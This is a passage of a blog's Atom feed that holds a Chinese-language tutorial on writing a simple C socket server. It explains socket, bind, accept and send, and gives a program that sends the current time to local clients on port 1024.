&lt;p&gt;2.接收&lt;br&gt;int recv(SOCKET socket, char FAR* buf, int len, int flags);&lt;br&gt;socket：一个标识已连接套接口的描述字。&lt;br&gt;buf：用于接收数据的缓冲区。&lt;br&gt;len：缓冲区长度。&lt;br&gt;flags：指定调用方式。&lt;br&gt;返回值：若无错误发生,recv()返回读入的字节数.如果连接已中止，返回0.否则的话,返回SOCKET_ERROR错误.&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>C语言之socket 简易服务端</title>
    <link href="http://binyanbin.github.io/2016/04/12/c-5/"/>
    <id>http://binyanbin.github.io/2016/04/12/c-5/</id>
    <published>2016-04-11T16:00:00.000Z</published>
    <updated>2016-06-15T15:52:46.000Z</updated>
    
    <content type="html">&lt;p&gt;今年有两个目标，一个是做开源项目，第二个是用C写一个网络服务。C写网络服务Socket是基础，首先需要了解socket的用法。服务端socket操作步骤:1.创建socket,2.绑定地址及端口,3.接收请求,4.发送数据。&lt;/p&gt;
&lt;h1 id=&quot;函数&quot;&gt;&lt;a href=&quot;#函数&quot; class=&quot;headerlink&quot; title=&quot;函数&quot;&gt;&lt;/a&gt;函数&lt;/h1&gt;&lt;p&gt;1.创建socket:&lt;br&gt;int socket(int domain, int type, int protocol);&lt;br&gt;domain：协议域&lt;br&gt;type：指定Socket类型。&lt;br&gt;protocol：指定协议。&lt;br&gt;返回值：如果调用成功就返回新创建的套接字的描述符，如果失败就返回-1。&lt;/p&gt;
&lt;p&gt;2.绑定地址级端口&lt;br&gt;int bind(SOCKET socket, const struct sockaddr* address, socklen_t address_len);&lt;br&gt;参数说明：&lt;br&gt;socket：是一个套接字描述符。&lt;br&gt;address：是一个sockaddr结构指针，该结构中包含了要结合的地址和端口号。&lt;br&gt;address_len：确定address缓冲区的长度。&lt;br&gt;返回值：如果函数执行成功，返回值为0，否则为SOCKET_ERROR。&lt;/p&gt;
&lt;p&gt;3.接收连接请求&lt;br&gt;int accept( int fd, struct socketaddr&lt;em&gt; addr, socklen_t&lt;/em&gt; len);&lt;br&gt;参数说明：&lt;br&gt;fd：套接字描述符。&lt;br&gt;addr：返回连接着的地址&lt;br&gt;len：接收返回地址的缓冲区长度&lt;br&gt;返回值：成功返回客户端的文件描述符，失败返回-1。&lt;/p&gt;
&lt;p&gt;4.发送数据&lt;br&gt;int send(int fd, const void * msg, int len, unsigned int falgs);&lt;br&gt;fd：套接字描述符。&lt;br&gt;msg: 数据内容。&lt;br&gt;len: 数据长度。&lt;br&gt;返回值：成功则返回实际传送出去的字符数, 失败返回-1.&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h1 id=&quot;服务端示例&quot;&gt;&lt;a href=&quot;#服务端示例&quot; class=&quot;headerlink&quot; title=&quot;服务端示例&quot;&gt;&lt;/a&gt;服务端示例&lt;/h1&gt;&lt;p&gt;新建server.c文件&lt;br&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;102&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt; MINGW32&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;ifdef&lt;/span&gt; MINGW32&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;winsock2.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;sys/socket.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;arpa/inet.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;endif&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt; LISTENQ 10&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; argc,&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *argv[])&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;//serverfd服务端套接字描述符，connectfd客户端套接字描述符&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; serverfd,connectfd;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; sockaddr_in serveraddr;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; buff[&lt;span class=&quot;number&quot;&gt;1024&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;time_t&lt;/span&gt; tlick;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; iRet;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;ifdef&lt;/span&gt; MINGW32&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;//Winsows下启用socket&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	WSADATA wsadata;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(WSAStartup(MAKEWORD(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;),&amp;amp;wsadata)==SOCKET_ERROR)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;WSAStartup() fail\n&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;built_in&quot;&gt;exit&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;endif&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;//新建server socket&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;socket()\n&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;//SOCK_STREAM提供面向连接的稳定数据传输，即TCP协议&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	serverfd=socket(AF_INET,SOCK_STREAM,&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(serverfd==&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;socket() fail\n&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;built_in&quot;&gt;exit&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;//清零&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;built_in&quot;&gt;memset&lt;/span&gt;(&amp;amp;serveraddr,&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,&lt;span class=&quot;keyword&quot;&gt;sizeof&lt;/span&gt;(serveraddr));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;//设置协议 AF_INET:ipv4地址（32位的）与端口号（16位的）的组合&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	serveraddr.sin_family=AF_INET;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;//设置IP 127.0.0.1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	serveraddr.sin_addr.s_addr=inet_addr(&lt;span class=&quot;string&quot;&gt;&quot;127.0.0.1&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;//设置Port&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	serveraddr.sin_port=htons(&lt;span class=&quot;number&quot;&gt;1024&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;//绑定端口，监听1024端口的任何请求&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;bind()\n&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	iRet=bind(serverfd,(&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; sockaddr*)&amp;amp;serveraddr,&lt;span class=&quot;keyword&quot;&gt;sizeof&lt;/span&gt;(serveraddr));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(iRet==&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;bind() fail\n&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;built_in&quot;&gt;exit&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;//监听端口，最大并发数10&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;listen()\n&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	iRet=listen(serverfd,LISTENQ);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(iRet==&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;listen() fail\n&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;built_in&quot;&gt;exit&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;//接受请求，发送主机时间&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(;;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;Waiting for connection...\n&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;comment&quot;&gt;//接受请求&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		connectfd=accept(serverfd,(&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; sockaddr*)&lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt;,&lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;comment&quot;&gt;//获取时间 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		tlick=time(&lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;comment&quot;&gt;//格式化时间 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;built_in&quot;&gt;snprintf&lt;/span&gt;(buff,&lt;span class=&quot;keyword&quot;&gt;sizeof&lt;/span&gt;(buff),&lt;span class=&quot;string&quot;&gt;&quot;From mys:\n%s&quot;&lt;/span&gt;,ctime(&amp;amp;tlick));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;comment&quot;&gt;//写入时间&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;comment&quot;&gt;//关闭请求&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;ifdef&lt;/span&gt; MINGW32&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		send(connectfd,buff,&lt;span class=&quot;built_in&quot;&gt;strlen&lt;/span&gt;(buff),&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		closesocket(connectfd);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		write(connectfd,buff,&lt;span class=&quot;built_in&quot;&gt;strlen&lt;/span&gt;(buff));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		close(connectfd);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;endif&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;ifdef&lt;/span&gt; MINGW32&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;//Winsows下关闭socket&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	closesocket(serverfd);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	WSACleanup();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;endif&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;//退出&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;built_in&quot;&gt;exit&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
